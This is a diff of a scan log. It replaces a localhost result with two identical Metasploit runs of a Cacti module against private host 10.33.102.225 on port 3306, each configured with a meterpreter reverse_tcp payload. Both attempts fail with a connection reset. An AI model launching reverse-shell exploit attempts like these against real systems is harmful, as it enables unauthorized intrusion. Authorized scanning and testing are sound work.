@@ -1,9 +1,20 @@
 
 
-=========== Vulnerability scanning result of target 127.0.0.1 
+=========== Vulnerability scanning result of target 10.33.102.225 
 
 [*] Using configured payload linux/x86/meterpreter/reverse_tcp
-RHOSTS => 127.0.0.1
-RPORT => 8080
+RHOSTS => 10.33.102.225
+RPORT => 3306
 TARGETURI => /cacti
-[*] 127.0.0.1:8080 - The target is not exploitable. Target is not a Cacti application.
+[-] Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
+[-] 10.33.102.225:3306 - Check failed: The state could not be determined.
+
+
+=========== Vulnerability scanning result of target 10.33.102.225 
+
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+RHOSTS => 10.33.102.225
+RPORT => 3306
+TARGETURI => /cacti
+[-] Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
+[-] 10.33.102.225:3306 - Check failed: The state could not be determined.
